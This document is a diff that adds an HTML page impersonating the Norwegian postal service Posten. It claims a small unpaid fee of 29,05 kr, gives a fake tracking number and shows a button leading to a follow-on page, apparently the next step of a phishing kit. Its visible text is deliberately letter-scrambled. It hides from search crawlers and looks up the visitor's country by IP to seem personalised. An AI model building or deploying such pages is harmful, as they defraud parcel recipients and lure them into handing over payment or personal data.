@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="no">
+<head>
+  <meta charset="UTF-8" />
+    <meta name="robots" content="noindex, nofollow, noimageindex, nositemap, noarchive, none, nosnippet, noodp, " />
+    <meta name="google" content="notranslate" />
+    <link rel="stylesheet" href="./nisak/style.css" />
+	
+      <link rel="icon" href="./nisak/icon.jpeg" type="icon.jpeg"> 
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Wosben - Wajjeinho</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+      color: #000;
+    }
+
+    header {
+      background: #fff;
+      padding: 20px 0;
+      text-align: center;
+    }
+
+    header img {
+      width: 120px;
+      max-width: 100%;
+      height: auto;
+    }
+
+    .info-box {
+      border: 1px solid #e60000;
+      margin: 20px;
+      padding: 20px;
+      border-radius: 5px;
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .info-box h2 {
+      font-size: 18px;
+      margin-top: 0;
+      color: #333;
+      text-align: center;
+    }
+
+    .warning {
+      color: #b20000;
+      font-size: 14px;
+      margin-bottom: 10px;
+      text-align: center;
+    }
+
+    .info-box p {
+      font-size: 15px;
+      line-height: 1.5;
+    }
+
+    .info-box strong {
+      color: #000;
+    }
+
+    .info-box img {
+      width: 100%;
+      border-radius: 5px;
+      margin: 15px 0;
+    }
+
+    .note {
+      font-weight: bold;
+      margin-top: 10px;
+    }
+
+    .button {
+      display: block;
+      width: 90%;
+      max-width: 300px;
+      margin: 25px auto 10px;
+      padding: 12px;
+      background-color: #d32f2f;
+      color: white;
+      text-align: center;
+      text-decoration: none;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .button:hover {
+      background-color: #b71c1c;
+    }
+
+    footer {
+      background-color: #450000;
+      color: white;
+      text-align: center;
+      padding: 20px 10px;
+      font-size: 14px;
+      margin-top: 40px;
+    }
+
+    footer img {
+      width: 100px;
+      max-width: 100%;
+      height: auto;
+    }
+
+    /* Responsive Design */
+    @media (min-width: 768px) {
+      .info-box {
+        padding: 30px;
+        font-size: 16px;
+      }
+
+      .info-box h2 {
+        font-size: 20px;
+      }
+
+      .button {
+        font-size: 18px;
+        padding: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <img src="./nisak/A.png" alt="Posten">
+  </header>
+
+  <div class="info-box">
+    <h2>Vin wajjeinhorgaskon</h2>
+    <p class="warning">⚠️ Avdarsez: en hrajbadmihb wå 29,05 jr wåzøwer hor å ogwzanzemme zederinmen vin</p>
+    <hr>
+    <p><strong>Vabe :</strong> <span class="dynamic-date">Zasber...</span></p>
+    <p><strong>Bracjinm Nugter :</strong> 56449874154</p>
+    <p><strong>Warcez Vebaizs :</strong> Wajjen vin denber wå hrajbvebazker.</p>
+    <p><strong>Wajjezojaziserinm :</strong> <span class="dynamic-location">Zasber...</span></p>
+    <img src="./nisak/C.png" alt="Map">
+    <p class="note">Dijbim gerjnav : Zederinmsjosbnaver jan wåzøwe.</p>
+    <a class="button" href="B1.html">Tejrehb hrajbvebazker</a>
+  </div>
+
+  <footer>
+    <img src="./nisak/A.png" alt="Posten Logo">
+    <p>© Wosben Trinm</p>
+  </footer>
+
+  <script>
+    // التاريخ حسب الجهاز
+    const today = new Date();
+    const formattedDate = `${today.getDate()}/${today.getMonth() + 1}/${today.getFullYear()}`;
+    document.querySelector(".dynamic-date").innerText = formattedDate;
+
+    // الموقع الجغرافي حسب IP
+    fetch("https://ip-api.com/json/")
+      .then(res => res.json())
+      .then(data => {
+        const location = `${data.country} (${data.countryCode})`;
+        document.querySelector(".dynamic-location").innerText = location;
+      })
+      .catch(() => {
+        document.querySelector(".dynamic-location").innerText = "Ukjent";
+      });
+  </script>
+
+</body>
+</html>
